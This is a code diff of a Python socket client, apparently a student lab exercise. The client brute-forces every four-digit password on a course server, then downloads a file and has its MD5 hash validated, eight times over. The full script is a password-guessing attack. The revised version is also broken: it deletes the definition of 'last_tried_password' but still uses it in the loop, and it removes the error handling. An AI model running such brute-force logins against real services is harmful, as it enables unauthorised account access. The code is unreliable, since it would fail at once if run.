@@ -67,6 +67,9 @@ def request_validate_hash(clientSocket, hash):
 
 	return False
 
+def request_close_connection(clientSocket):
+	clientSocket.send(create_request_message(CLOSE_CONNECTION))
+
 # ------- UTIL METHODS -------------------------------------------------------------
 
 def create_request_message(method_code, data=""):
@@ -120,39 +123,40 @@ def create_socket(student_key):
 # get student key to establish connection with server
 student_key = sys.argv[1]
 
-num_success = 0
-last_tried_password = 0 # all possible password combinations (0000-9999)
-
 # request for connection to server
 clientSocket = create_socket(student_key)
 
-while (num_success < 8):
-	# try to login using all possible password combinations (0000-9999)
-	for i in range(last_tried_password, 10000):
-		try:
-			can_login = request_login(clientSocket, str(i).zfill(4))
-			# print("--- trying password: " + str(i).zfill(4)) # FOR DEBUGGING ONLY: see how far we could get
+# keep track of the number of successful file-retrievals
+num_success = 0
 
-			if (can_login):
-				print("--- CORRECT PASSWORD: " + str(i).zfill(4)) # FOR DEBUGGING ONLY: see how far we could get
+# try to login using all possible password combinations (0000-9999)
+for i in range(last_tried_password, 10000):
+		password = str(i).zfill(4)
+		can_login = request_login(clientSocket, password)
 
-				target_file = request_get_file(clientSocket)
-				md5_hash = generate_MD5_hash(target_file)
-				is_valid_hash = request_validate_hash(clientSocket, md5_hash)
+		if (can_login):
+			print("--- CORRECT PASSWORD: " + password) # FOR DEBUGGING ONLY: see how far we could get
 
-				if (not is_valid_hash):
-					print("hash generated from the file is not valid")
-					clientSocket.close()
-					exit(1)
+			target_file = request_get_file(clientSocket)
+			md5_hash = generate_MD5_hash(target_file)
+			is_valid_hash = request_validate_hash(clientSocket, md5_hash)
 
-				num_success += 1
-				print("successful file validation")
+			if (not is_valid_hash):
+				print("hash generated from the file is not valid")
+				clientSocket.close()
+				exit(1)
 
-				request_logout(clientSocket)
+			num_success += 1
+			print("number of successful file-retrievals: " + str(num_success))
+			request_logout(clientSocket)
+
+			if (num_success == 8):
+				print("done")
 				break
-		except ConnectionError:
-			last_tried_password = i-1
-			clientSocket = create_socket(student_key)
+
+# close the connection to the server
+request_close_connection(clientSocket)
+clientSocket.close()
 
 
 
